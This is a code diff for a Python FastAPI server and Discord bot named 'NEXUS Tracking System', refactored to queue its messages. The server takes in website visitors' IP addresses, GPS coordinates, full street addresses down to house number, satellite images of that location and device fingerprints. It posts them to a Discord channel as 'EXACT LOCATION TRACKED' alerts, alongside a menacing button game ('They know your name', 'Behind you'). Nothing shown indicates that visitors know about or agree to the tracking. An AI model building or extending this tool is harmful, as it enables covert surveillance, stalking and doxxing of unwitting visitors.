@@ -15,7 +15,9 @@ from pydantic import BaseModel
 from dotenv import load_dotenv
 import traceback
 import hashlib
-import aiohttp
+import time
+from queue import Queue
+from threading import Thread
 
 load_dotenv()
 
@@ -34,7 +36,6 @@ if not DISCORD_CHANNEL_ID:
 
 # ==================== DATA MODELS ====================
 class VisitorInfo(BaseModel):
-    # Basic info
     ip: str = "N/A"
     city: str = "N/A"
     region: str = "N/A"
@@ -43,28 +44,23 @@ class VisitorInfo(BaseModel):
     userAgent: str = "N/A"
     screen: dict = {}
     browser: dict = {}
-    
-    # Advanced location
     location: dict = {}
     address: dict = {}
     coordinates: dict = {}
     accuracy: float = 0
     source: str = "Unknown"
-    
-    # System
     system: dict = {}
     fragments: list = []
     button_presses: int = 0
 
-# ==================== SIMPLE STORAGE (No database locks) ====================
-# Using in-memory storage to avoid database issues
+# ==================== SIMPLE STORAGE ====================
 visitors = {}
 visits = []
+message_queue = Queue()
 
 # ==================== FASTAPI SETUP ====================
 app = FastAPI(title="NEXUS Tracking System")
 
-# CORS for frontend
 app.add_middleware(
     CORSMiddleware,
     allow_origins=[FRONTEND_URL, "http://localhost:3000", "*"],
@@ -74,13 +70,33 @@ app.add_middleware(
 )
 
 # ==================== DISCORD BOT SETUP ====================
+intents = discord.Intents.default()
+intents.message_content = True
+
 class NexusBot(commands.Bot):
     def __init__(self):
-        intents = discord.Intents.default()
-        intents.message_content = True
         super().__init__(command_prefix='!', intents=intents)
         self.channel = None
         self.ready = False
+        self.message_queue = Queue()
+
+    async def setup_hook(self):
+        await self.tree.sync()
+        print("✅ Slash commands synced")
+
+    async def process_queue(self):
+        """Process messages from the queue"""
+        while True:
+            if not self.message_queue.empty():
+                msg = self.message_queue.get()
+                try:
+                    if msg['type'] == 'embed' and self.channel:
+                        await self.channel.send(embed=msg['data'])
+                    elif msg['type'] == 'content' and self.channel:
+                        await self.channel.send(content=msg['data'])
+                except Exception as e:
+                    print(f"❌ Queue send error: {e}")
+            await asyncio.sleep(0.1)
 
 bot = NexusBot()
 
@@ -97,6 +113,9 @@ async def on_ready():
         
         bot.ready = True
         print(f'✅ Connected to channel: #{bot.channel.name}')
+        
+        # Start queue processor
+        asyncio.create_task(bot.process_queue())
         
         embed = Embed(
             title="🔮 NEXUS SYSTEM ONLINE",
@@ -116,308 +135,272 @@ async def on_ready():
 
 # ==================== SATELLITE IMAGE FUNCTION ====================
 def get_satellite_url(lat: float, lon: float):
-    """Get satellite image URL for coordinates using ESRI"""
+    """Get satellite image URL for coordinates"""
     zoom = 18
     x = int((lon + 180) / 360 * (2 ** zoom))
     y = int((1 - math.log(math.tan(math.radians(lat)) + 1 / math.cos(math.radians(lat))) / math.pi) / 2 * (2 ** zoom))
-    
-    # Using ESRI satellite imagery (free, no API key)
     return f"https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{zoom}/{y}/{x}"
 
-# ==================== DISCORD SEND FUNCTIONS ====================
-async def send_location_to_discord(user_id: str, data: dict, ip: str):
-    """Send location data with full address and satellite image"""
-    try:
-        coords = data.get('coordinates', {})
-        addr = data.get('address', {})
-        loc = data.get('location', {})
-        
-        if not coords:
-            return
-        
-        lat = coords.get('lat')
-        lon = coords.get('lon')
-        
-        # MAIN LOCATION EMBED with FULL ADDRESS
-        embed = Embed(
-            title="📍 EXACT LOCATION TRACKED",
-            color=Color.red(),
-            timestamp=datetime.now()
-        )
-        
-        # User info
-        embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
-        embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
-        embed.add_field(name="📡 Source", value=f"`{data.get('source', 'GPS')}`", inline=True)
-        embed.add_field(name="🎯 Accuracy", value=f"`{data.get('accuracy', '?')}m`", inline=True)
-        
-        # Coordinates
+# ==================== EMBED CREATION FUNCTIONS ====================
+def create_location_embed(user_id: str, data: dict, ip: str):
+    """Create location embed"""
+    coords = data.get('coordinates', {})
+    addr = data.get('address', {})
+    loc = data.get('location', {})
+    
+    if not coords:
+        return None
+    
+    lat = coords.get('lat')
+    lon = coords.get('lon')
+    
+    embed = Embed(
+        title="📍 EXACT LOCATION TRACKED",
+        color=Color.red(),
+        timestamp=datetime.now()
+    )
+    
+    embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
+    embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
+    embed.add_field(name="📡 Source", value=f"`{data.get('source', 'GPS')}`", inline=True)
+    embed.add_field(name="🎯 Accuracy", value=f"`{data.get('accuracy', '?')}m`", inline=True)
+    
+    embed.add_field(
+        name="📍 Coordinates",
+        value=f"```\nLatitude:  {lat:.6f}\nLongitude: {lon:.6f}```",
+        inline=False
+    )
+    
+    if loc.get('display_name'):
         embed.add_field(
-            name="📍 Coordinates",
-            value=f"```\nLatitude:  {lat:.6f}\nLongitude: {lon:.6f}```",
+            name="🏠 EXACT ADDRESS",
+            value=f"```{loc.get('display_name')}```",
             inline=False
         )
-        
-        # FULL ADDRESS (exact format from old system)
-        if loc.get('display_name'):
-            embed.add_field(
-                name="🏠 EXACT ADDRESS",
-                value=f"```{loc.get('display_name')}```",
-                inline=False
-            )
-        
-        # ADDRESS DETAILS (house number, road, city, state, zip, country)
-        details = []
-        if addr.get('house_number'): 
-            details.append(f"🏠 **House:** {addr.get('house_number')}")
-        if addr.get('road'): 
-            details.append(f"🛣️ **Road:** {addr.get('road')}")
-        if addr.get('neighbourhood'): 
-            details.append(f"🏘️ **Neighbourhood:** {addr.get('neighbourhood')}")
-        if addr.get('suburb'): 
-            details.append(f"🏘️ **Suburb:** {addr.get('suburb')}")
-        if addr.get('city') or addr.get('town') or addr.get('village'): 
-            city = addr.get('city') or addr.get('town') or addr.get('village')
-            details.append(f"🏙️ **City:** {city}")
-        if addr.get('county'): 
-            details.append(f"🗺️ **County:** {addr.get('county')}")
-        if addr.get('state'): 
-            details.append(f"📍 **State:** {addr.get('state')}")
-        if addr.get('postcode'): 
-            details.append(f"📮 **ZIP:** {addr.get('postcode')}")
-        if addr.get('country'): 
-            details.append(f"🌍 **Country:** {addr.get('country')}")
-        
-        if details:
-            embed.add_field(name="📋 Location Details", value="\n".join(details), inline=False)
-        
-        # Maps links
-        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
-        street_url = f"https://www.google.com/maps?q={lat},{lon}&layer=c"
-        
-        embed.add_field(name="🗺️ Google Maps", value=f"[Open in Maps]({maps_url})", inline=True)
-        embed.add_field(name="📸 Street View", value=f"[View Street]({street_url})", inline=True)
-        
-        await bot.channel.send(embed=embed)
-        
-        # SATELLITE IMAGE EMBED
-        satellite_url = get_satellite_url(lat, lon)
-        
-        sat_embed = Embed(
-            title="🛰️ SATELLITE IMAGERY",
-            description=f"**Location:** {lat:.6f}, {lon:.6f}",
-            color=Color.blue(),
-            timestamp=datetime.now()
-        )
-        sat_embed.set_image(url=satellite_url)
-        
-        # Add location context to satellite embed
-        location_context = []
-        if addr.get('city') or addr.get('town'):
-            location_context.append(f"📍 {addr.get('city') or addr.get('town')}")
-        if addr.get('state'):
-            location_context.append(addr.get('state'))
-        if addr.get('country'):
-            location_context.append(addr.get('country'))
-        
-        if location_context:
-            sat_embed.add_field(name="Location", value=", ".join(location_context), inline=True)
-        
-        sat_embed.add_field(name="Zoom Level", value="`18`", inline=True)
-        sat_embed.add_field(name="Source", value="ESRI World Imagery", inline=True)
-        
-        await bot.channel.send(embed=sat_embed)
-        
-        print(f"✅ Sent location + satellite for {user_id[:8]}")
-        
-    except Exception as e:
-        print(f"❌ Location send error: {e}")
+    
+    details = []
+    if addr.get('house_number'): 
+        details.append(f"🏠 **House:** {addr.get('house_number')}")
+    if addr.get('road'): 
+        details.append(f"🛣️ **Road:** {addr.get('road')}")
+    if addr.get('neighbourhood'): 
+        details.append(f"🏘️ **Neighbourhood:** {addr.get('neighbourhood')}")
+    if addr.get('suburb'): 
+        details.append(f"🏘️ **Suburb:** {addr.get('suburb')}")
+    if addr.get('city') or addr.get('town') or addr.get('village'): 
+        city = addr.get('city') or addr.get('town') or addr.get('village')
+        details.append(f"🏙️ **City:** {city}")
+    if addr.get('county'): 
+        details.append(f"🗺️ **County:** {addr.get('county')}")
+    if addr.get('state'): 
+        details.append(f"📍 **State:** {addr.get('state')}")
+    if addr.get('postcode'): 
+        details.append(f"📮 **ZIP:** {addr.get('postcode')}")
+    if addr.get('country'): 
+        details.append(f"🌍 **Country:** {addr.get('country')}")
+    
+    if details:
+        embed.add_field(name="📋 Location Details", value="\n".join(details), inline=False)
+    
+    maps_url = f"https://www.google.com/maps?q={lat},{lon}"
+    street_url = f"https://www.google.com/maps?q={lat},{lon}&layer=c"
+    
+    embed.add_field(name="🗺️ Google Maps", value=f"[Open in Maps]({maps_url})", inline=True)
+    embed.add_field(name="📸 Street View", value=f"[View Street]({street_url})", inline=True)
+    
+    return embed
 
-async def send_system_to_discord(user_id: str, data: dict, ip: str):
-    """Send system fingerprint"""
-    try:
-        sys = data.get('system', {})
-        browser = data.get('browser', {})
-        
-        embed = Embed(
-            title="💻 SYSTEM FINGERPRINT",
-            color=Color.blue(),
-            timestamp=datetime.now()
-        )
-        
-        embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
-        embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
-        embed.add_field(name="💿 Platform", value=f"`{sys.get('platform', '?')}`", inline=True)
-        embed.add_field(name="⚡ CPU Cores", value=f"`{sys.get('cores', '?')}`", inline=True)
-        embed.add_field(name="💾 RAM", value=f"`{sys.get('memory', '?')}`", inline=True)
-        
-        screen = sys.get('screen', {})
-        if isinstance(screen, dict):
-            screen_size = f"{screen.get('width', '?')}x{screen.get('height', '?')}"
-        else:
-            screen_size = str(screen)
-        embed.add_field(name="📺 Screen", value=f"`{screen_size}`", inline=True)
-        
-        embed.add_field(name="⏰ Timezone", value=f"`{data.get('timezone', '?')}`", inline=True)
-        embed.add_field(name="🗣️ Language", value=f"`{browser.get('language', '?')}`", inline=True)
-        embed.add_field(name="🍪 Cookies", value=f"`{'Enabled' if browser.get('cookies') else 'Disabled'}`", inline=True)
-        
-        # Generate fingerprint
-        fingerprint = hashlib.md5(
-            f"{sys.get('platform')}{data.get('timezone')}{sys.get('cores')}".encode()
-        ).hexdigest()[:8]
-        embed.add_field(name="🆔 Fingerprint", value=f"`{fingerprint}`", inline=False)
-        
-        await bot.channel.send(embed=embed)
-        print(f"✅ Sent system info for {user_id[:8]}")
-        
-    except Exception as e:
-        print(f"❌ System send error: {e}")
+def create_satellite_embed(user_id: str, data: dict):
+    """Create satellite embed"""
+    coords = data.get('coordinates', {})
+    addr = data.get('address', {})
+    
+    if not coords:
+        return None
+    
+    lat = coords.get('lat')
+    lon = coords.get('lon')
+    satellite_url = get_satellite_url(lat, lon)
+    
+    embed = Embed(
+        title="🛰️ SATELLITE IMAGERY",
+        description=f"**Location:** {lat:.6f}, {lon:.6f}",
+        color=Color.blue(),
+        timestamp=datetime.now()
+    )
+    embed.set_image(url=satellite_url)
+    
+    location_context = []
+    if addr.get('city') or addr.get('town'):
+        location_context.append(addr.get('city') or addr.get('town'))
+    if addr.get('state'):
+        location_context.append(addr.get('state'))
+    if addr.get('country'):
+        location_context.append(addr.get('country'))
+    
+    if location_context:
+        embed.add_field(name="Location", value=", ".join(location_context), inline=True)
+    
+    embed.add_field(name="Zoom Level", value="`18`", inline=True)
+    embed.add_field(name="Source", value="ESRI World Imagery", inline=True)
+    
+    return embed
 
-async def send_new_visitor(user_id: str, data: dict, ip: str):
-    """Send new visitor alert"""
-    try:
-        embed = Embed(
-            title="🎯 NEW VISITOR DETECTED",
-            color=Color.purple(),
-            timestamp=datetime.now()
-        )
-        
-        embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
-        embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
-        embed.add_field(name="📍 Location", value=f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}", inline=True)
-        
-        sys = data.get('system', {})
-        embed.add_field(name="💻 Platform", value=f"`{sys.get('platform', 'N/A')}`", inline=True)
-        
-        # Get today's visitor count
-        today = datetime.now().strftime('%Y-%m-%d')
-        today_count = len([v for v in visitors.values() if v.get('first_seen', '').startswith(today)])
-        
-        embed.set_footer(text=f"Today's visitors: {today_count}")
-        
-        await bot.channel.send(embed=embed)
-        print(f"✅ Sent new visitor alert for {user_id[:8]}")
-        
-    except Exception as e:
-        print(f"❌ New visitor send error: {e}")
+def create_system_embed(user_id: str, data: dict, ip: str):
+    """Create system info embed"""
+    sys = data.get('system', {})
+    browser = data.get('browser', {})
+    
+    embed = Embed(
+        title="💻 SYSTEM FINGERPRINT",
+        color=Color.blue(),
+        timestamp=datetime.now()
+    )
+    
+    embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
+    embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
+    embed.add_field(name="💿 Platform", value=f"`{sys.get('platform', '?')}`", inline=True)
+    embed.add_field(name="⚡ CPU Cores", value=f"`{sys.get('cores', '?')}`", inline=True)
+    embed.add_field(name="💾 RAM", value=f"`{sys.get('memory', '?')}`", inline=True)
+    
+    screen = sys.get('screen', {})
+    if isinstance(screen, dict):
+        screen_size = f"{screen.get('width', '?')}x{screen.get('height', '?')}"
+    else:
+        screen_size = str(screen)
+    embed.add_field(name="📺 Screen", value=f"`{screen_size}`", inline=True)
+    
+    embed.add_field(name="⏰ Timezone", value=f"`{data.get('timezone', '?')}`", inline=True)
+    embed.add_field(name="🗣️ Language", value=f"`{browser.get('language', '?')}`", inline=True)
+    
+    fingerprint = hashlib.md5(
+        f"{sys.get('platform')}{data.get('timezone')}{sys.get('cores')}".encode()
+    ).hexdigest()[:8]
+    embed.add_field(name="🆔 Fingerprint", value=f"`{fingerprint}`", inline=False)
+    
+    return embed
 
-async def send_button_press(user_id: str, presses: int, ip: str):
-    """Send button press alert"""
-    try:
-        embed = Embed(
-            title="🚫 FORBIDDEN BUTTON PRESSED",
-            color=Color.dark_red(),
-            timestamp=datetime.now()
-        )
-        
-        embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
-        embed.add_field(name="🔢 Press Count", value=f"`{presses}`", inline=True)
-        embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
-        
-        messages = [
-            "Why did you do that?",
-            "They're watching now.",
-            "The button knows.",
-            "Check your surroundings.",
-            "Only 5 presses left...",
-            "You shouldn't have done that.",
-            "They know your name.",
-            "It's too late now.",
-            "The screen is glitching.",
-            "Behind you."
-        ]
-        
-        if presses <= len(messages):
-            embed.add_field(name="💬 Message", value=f"```{messages[presses-1]}```", inline=False)
-        
-        if presses in [3, 6, 9]:
-            embed.add_field(name="⚠️ EVENT", value="Reality fragment discovered!", inline=False)
-        
-        if presses == 9:
-            embed.add_field(name="🔓 SECRET", value="Coordinates revealed: `60.233, 24.866`", inline=False)
-        
-        await bot.channel.send(embed=embed)
-        print(f"✅ Sent button press {presses} for {user_id[:8]}")
-        
-    except Exception as e:
-        print(f"❌ Button send error: {e}")
+def create_new_visitor_embed(user_id: str, data: dict, ip: str):
+    """Create new visitor embed"""
+    embed = Embed(
+        title="🎯 NEW VISITOR DETECTED",
+        color=Color.purple(),
+        timestamp=datetime.now()
+    )
+    
+    embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
+    embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
+    embed.add_field(name="📍 Location", value=f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}", inline=True)
+    
+    sys = data.get('system', {})
+    embed.add_field(name="💻 Platform", value=f"`{sys.get('platform', 'N/A')}`", inline=True)
+    
+    today = datetime.now().strftime('%Y-%m-%d')
+    today_count = len([v for v in visitors.values() if v.get('first_seen', '').startswith(today)])
+    
+    embed.set_footer(text=f"Today's visitors: {today_count}")
+    
+    return embed
 
-async def send_fragment(user_id: str, fragment: int, total: int, ip: str):
-    """Send fragment found alert"""
-    try:
-        embed = Embed(
-            title="🧩 REALITY FRAGMENT FOUND",
-            color=Color.green(),
-            timestamp=datetime.now()
-        )
-        
-        embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
-        embed.add_field(name="🧩 Fragment", value=f"`{fragment}/9`", inline=True)
-        embed.add_field(name="📊 Progress", value=f"`{total}/9`", inline=True)
-        embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
-        
-        # Progress bar
-        progress = "▓" * total + "░" * (9 - total)
-        embed.add_field(name="📈 Collection", value=f"`{progress}`", inline=False)
-        
-        await bot.channel.send(embed=embed)
-        print(f"✅ Sent fragment {fragment} for {user_id[:8]}")
-        
-    except Exception as e:
-        print(f"❌ Fragment send error: {e}")
+def create_button_embed(user_id: str, presses: int, ip: str):
+    """Create button press embed"""
+    embed = Embed(
+        title="🚫 FORBIDDEN BUTTON PRESSED",
+        color=Color.dark_red(),
+        timestamp=datetime.now()
+    )
+    
+    embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
+    embed.add_field(name="🔢 Press Count", value=f"`{presses}`", inline=True)
+    embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
+    
+    messages = [
+        "Why did you do that?",
+        "They're watching now.",
+        "The button knows.",
+        "Check your surroundings.",
+        "Only 5 presses left...",
+        "You shouldn't have done that.",
+        "They know your name.",
+        "It's too late now.",
+        "The screen is glitching.",
+        "Behind you."
+    ]
+    
+    if presses <= len(messages):
+        embed.add_field(name="💬 Message", value=f"```{messages[presses-1]}```", inline=False)
+    
+    if presses in [3, 6, 9]:
+        embed.add_field(name="⚠️ EVENT", value="Reality fragment discovered!", inline=False)
+    
+    if presses == 9:
+        embed.add_field(name="🔓 SECRET", value="Coordinates revealed: `60.233, 24.866`", inline=False)
+    
+    return embed
 
-async def send_summary(user_id: str, data: dict, ip: str):
-    """Send summary of all data"""
-    try:
-        embed = Embed(
-            title=f"📊 VISITOR SUMMARY",
-            color=Color.gold(),
-            timestamp=datetime.now()
-        )
-        
-        embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
-        embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
-        embed.add_field(name="📍 Location", value=f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}", inline=True)
-        
-        if data.get('coordinates'):
-            coords = data.get('coordinates', {})
-            embed.add_field(
-                name="📍 Coordinates", 
-                value=f"`{coords.get('lat', '?')}, {coords.get('lon', '?')}`", 
-                inline=True
-            )
-        
-        sys = data.get('system', {})
+def create_fragment_embed(user_id: str, fragment: int, total: int, ip: str):
+    """Create fragment embed"""
+    embed = Embed(
+        title="🧩 REALITY FRAGMENT FOUND",
+        color=Color.green(),
+        timestamp=datetime.now()
+    )
+    
+    embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
+    embed.add_field(name="🧩 Fragment", value=f"`{fragment}/9`", inline=True)
+    embed.add_field(name="📊 Progress", value=f"`{total}/9`", inline=True)
+    embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
+    
+    progress = "▓" * total + "░" * (9 - total)
+    embed.add_field(name="📈 Collection", value=f"`{progress}`", inline=False)
+    
+    return embed
+
+def create_summary_embed(user_id: str, data: dict, ip: str):
+    """Create summary embed"""
+    embed = Embed(
+        title=f"📊 VISITOR SUMMARY",
+        color=Color.gold(),
+        timestamp=datetime.now()
+    )
+    
+    embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
+    embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
+    embed.add_field(name="📍 Location", value=f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}", inline=True)
+    
+    if data.get('coordinates'):
+        coords = data.get('coordinates', {})
         embed.add_field(
-            name="💻 System", 
-            value=f"`{sys.get('platform', 'N/A')}`", 
+            name="📍 Coordinates", 
+            value=f"`{coords.get('lat', '?')}, {coords.get('lon', '?')}`", 
             inline=True
         )
-        
-        if data.get('button_presses', 0) > 0:
-            embed.add_field(name="🚫 Button", value=f"`{data.get('button_presses')} presses`", inline=True)
-        
-        fragments = data.get('fragments', [])
-        if fragments:
-            embed.add_field(name="🧩 Fragments", value=f"`{len(fragments)}/9`", inline=True)
-        
-        # Add address snippet if available
-        addr = data.get('address', {})
-        if addr.get('city') or addr.get('country'):
-            location_parts = []
-            if addr.get('city'): location_parts.append(addr.get('city'))
-            if addr.get('state'): location_parts.append(addr.get('state'))
-            if addr.get('country'): location_parts.append(addr.get('country'))
-            embed.add_field(name="📍 Location", value=", ".join(location_parts), inline=True)
-        
-        embed.set_footer(text=f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-        
-        await bot.channel.send(embed=embed)
-        print(f"✅ Sent summary for {user_id[:8]}")
-        
-    except Exception as e:
-        print(f"❌ Summary send error: {e}")
+    
+    sys = data.get('system', {})
+    embed.add_field(
+        name="💻 System", 
+        value=f"`{sys.get('platform', 'N/A')}`", 
+        inline=True
+    )
+    
+    if data.get('button_presses', 0) > 0:
+        embed.add_field(name="🚫 Button", value=f"`{data.get('button_presses')} presses`", inline=True)
+    
+    fragments = data.get('fragments', [])
+    if fragments:
+        embed.add_field(name="🧩 Fragments", value=f"`{len(fragments)}/9`", inline=True)
+    
+    addr = data.get('address', {})
+    if addr.get('city') or addr.get('country'):
+        location_parts = []
+        if addr.get('city'): location_parts.append(addr.get('city'))
+        if addr.get('state'): location_parts.append(addr.get('state'))
+        if addr.get('country'): location_parts.append(addr.get('country'))
+        embed.add_field(name="📍 Location", value=", ".join(location_parts), inline=True)
+    
+    embed.set_footer(text=f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    
+    return embed
 
 # ==================== FASTAPI ENDPOINTS ====================
 @app.get("/")
@@ -427,8 +410,7 @@ async def root():
         "status": "online",
         "bot_ready": bot.ready,
         "frontend": FRONTEND_URL,
-        "channel_id": DISCORD_CHANNEL_ID,
-        "visitors_today": len([v for v in visitors.values() if v.get('first_seen', '').startswith(datetime.now().strftime('%Y-%m-%d'))])
+        "channel_id": DISCORD_CHANNEL_ID
     }
 
 @app.get("/api/health")
@@ -441,7 +423,7 @@ async def health():
 
 @app.post("/submit")
 async def submit_visitor(request: Request, visitor: VisitorInfo):
-    """Receive visitor data and send to Discord"""
+    """Receive visitor data and queue for Discord"""
     try:
         data = visitor.dict()
         client_ip = request.client.host
@@ -470,42 +452,58 @@ async def submit_visitor(request: Request, visitor: VisitorInfo):
             'data': data
         })
         
-        # Send to Discord if bot is ready
+        # Queue messages for Discord (non-blocking)
         if bot.ready and bot.channel:
-            # Send new visitor alert
+            # Queue new visitor embed
             if is_new:
-                await send_new_visitor(user_id, data, client_ip)
+                embed = create_new_visitor_embed(user_id, data, client_ip)
+                if embed:
+                    bot.message_queue.put({'type': 'embed', 'data': embed})
             
-            # Send location with satellite
+            # Queue location and satellite embeds
             if data.get('coordinates'):
-                await send_location_to_discord(user_id, data, client_ip)
+                loc_embed = create_location_embed(user_id, data, client_ip)
+                if loc_embed:
+                    bot.message_queue.put({'type': 'embed', 'data': loc_embed})
+                
+                sat_embed = create_satellite_embed(user_id, data)
+                if sat_embed:
+                    bot.message_queue.put({'type': 'embed', 'data': sat_embed})
             
-            # Send system info
+            # Queue system embed
             if data.get('system'):
-                await send_system_to_discord(user_id, data, client_ip)
+                sys_embed = create_system_embed(user_id, data, client_ip)
+                if sys_embed:
+                    bot.message_queue.put({'type': 'embed', 'data': sys_embed})
             
-            # Send button presses
+            # Queue button press embeds
             if data.get('button_presses', 0) > 0:
-                await send_button_press(user_id, data.get('button_presses'), client_ip)
+                btn_embed = create_button_embed(user_id, data.get('button_presses'), client_ip)
+                if btn_embed:
+                    bot.message_queue.put({'type': 'embed', 'data': btn_embed})
             
-            # Send fragments
+            # Queue fragment embeds
             fragments = data.get('fragments', [])
             if fragments:
                 for fragment in fragments:
-                    await send_fragment(user_id, fragment, len(fragments), client_ip)
+                    frag_embed = create_fragment_embed(user_id, fragment, len(fragments), client_ip)
+                    if frag_embed:
+                        bot.message_queue.put({'type': 'embed', 'data': frag_embed})
             
-            # Send summary
-            await send_summary(user_id, data, client_ip)
+            # Queue summary embed
+            summary_embed = create_summary_embed(user_id, data, client_ip)
+            if summary_embed:
+                bot.message_queue.put({'type': 'embed', 'data': summary_embed})
             
-            print(f"✅ All data sent to Discord for user {user_id[:8]}")
+            print(f"✅ Queued {bot.message_queue.qsize()} messages for Discord")
         else:
-            print(f"⚠️ Bot not ready - message not sent")
+            print(f"⚠️ Bot not ready - messages queued locally")
         
         return JSONResponse({
             "status": "success", 
             "user_id": user_id, 
             "is_new": is_new,
-            "discord_sent": bot.ready and bot.channel is not None
+            "queued": bot.message_queue.qsize()
         })
         
     except Exception as e:
@@ -520,21 +518,10 @@ async def stats(interaction: discord.Interaction):
     
     total_users = len(visitors)
     total_visits = len(visits)
+    queue_size = bot.message_queue.qsize()
     
     today = datetime.now().strftime('%Y-%m-%d')
     today_visits = len([v for v in visits if v['timestamp'].startswith(today)])
-    
-    # Get latest location
-    latest_visit = None
-    latest_location = "No locations yet"
-    for visit in reversed(visits):
-        if visit['data'].get('coordinates'):
-            latest_visit = visit
-            break
-    
-    if latest_visit:
-        coords = latest_visit['data'].get('coordinates', {})
-        latest_location = f"{coords.get('lat', '?')}, {coords.get('lon', '?')}"
     
     embed = Embed(
         title="📊 NEXUS STATISTICS",
@@ -545,7 +532,7 @@ async def stats(interaction: discord.Interaction):
     embed.add_field(name="Total Users", value=f"`{total_users}`", inline=True)
     embed.add_field(name="Total Visits", value=f"`{total_visits}`", inline=True)
     embed.add_field(name="Today's Visits", value=f"`{today_visits}`", inline=True)
-    embed.add_field(name="Latest Location", value=f"`{latest_location}`", inline=False)
+    embed.add_field(name="Queue Size", value=f"`{queue_size}`", inline=True)
     
     await interaction.followup.send(embed=embed)
 
@@ -585,6 +572,11 @@ async def recent(interaction: discord.Interaction, limit: int = 5):
     
     await interaction.followup.send(embed=embed)
 
+@bot.tree.command(name="queue", description="Show queue status")
+async def queue_status(interaction: discord.Interaction):
+    queue_size = bot.message_queue.qsize()
+    await interaction.response.send_message(f"📊 Queue has `{queue_size}` messages waiting")
+
 @bot.tree.command(name="help", description="Show all available commands")
 async def help_command(interaction: discord.Interaction):
     embed = Embed(
@@ -596,6 +588,7 @@ async def help_command(interaction: discord.Interaction):
     commands = [
         "`/stats` - View tracking statistics",
         "`/recent [limit]` - Show recent locations",
+        "`/queue` - Show message queue status",
         "`/help` - Show this message"
     ]
     
@@ -605,20 +598,23 @@ async def help_command(interaction: discord.Interaction):
     await interaction.response.send_message(embed=embed)
 
 # ==================== STARTUP ====================
-async def run_bot():
-    try:
-        await bot.start(BOT_TOKEN)
-    except Exception as e:
-        print(f"❌ Bot error: {e}")
-
-def start_bot_thread():
+def run_bot():
+    """Run bot in a separate thread with its own event loop"""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    loop.run_until_complete(run_bot())
+    
+    async def start_bot():
+        try:
+            await bot.start(BOT_TOKEN)
+        except Exception as e:
+            print(f"❌ Bot error: {e}")
+    
+    loop.run_until_complete(start_bot())
 
 @app.on_event("startup")
 async def startup_event():
-    thread = threading.Thread(target=start_bot_thread, daemon=True)
+    """Start Discord bot thread"""
+    thread = Thread(target=run_bot, daemon=True)
     thread.start()
     print("✅ Discord bot thread started")
 
